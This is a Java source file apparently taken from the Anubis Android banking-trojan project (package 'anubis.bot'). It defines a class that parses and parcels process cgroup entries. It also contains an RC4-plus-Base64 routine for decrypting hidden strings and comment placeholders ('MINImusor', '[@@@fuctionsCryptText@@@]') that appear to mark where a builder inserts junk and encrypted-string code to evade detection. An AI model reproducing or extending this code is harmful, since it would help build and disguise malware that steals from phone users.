package anubis.bot.myapplication.API.ProcessesSDK6;

import android.os.Parcel;
import android.os.Parcelable;
import android.util.Base64;

import java.util.Locale;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class classProcControlGroup implements Parcelable {
  UtilsClass SF = new UtilsClass();
  //MINImusor2

  //[@@@fuctionsCryptText@@@]
  //MINImusor1

  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }


  public final int id;

  public final String subsystems;

  public final String group;

  protected classProcControlGroup(String line) throws NumberFormatException, IndexOutOfBoundsException {
    String[] fields = line.split(Character.toString(':'));
    id = Integer.parseInt(fields[0]);
    subsystems = fields[1];
    group = fields[2];
  }

  protected classProcControlGroup(Parcel in) {
    this.id = in.readInt();
    this.subsystems = in.readString();
    this.group = in.readString();
  }
  //MINImusor3
  @Override
  public int describeContents() {
    return 0;
  }

  @Override
  public void writeToParcel(Parcel dest, int flags) {
    dest.writeInt(this.id);
    dest.writeString(this.subsystems);
    dest.writeString(this.group);
  }
  @Override
  public String toString() {
    return String.format(Locale.ENGLISH, "%d:%s:%s", id, subsystems, group);
  }
  //MINImusor5
  public static final Creator<classProcControlGroup> CREATOR = new Creator<classProcControlGroup>() {

    @Override
    public classProcControlGroup createFromParcel(Parcel source) {
      return new classProcControlGroup(source);
    }
    @Override
    public classProcControlGroup[] newArray(int GGD) {
      return new classProcControlGroup[GGD];
    }
  };
}
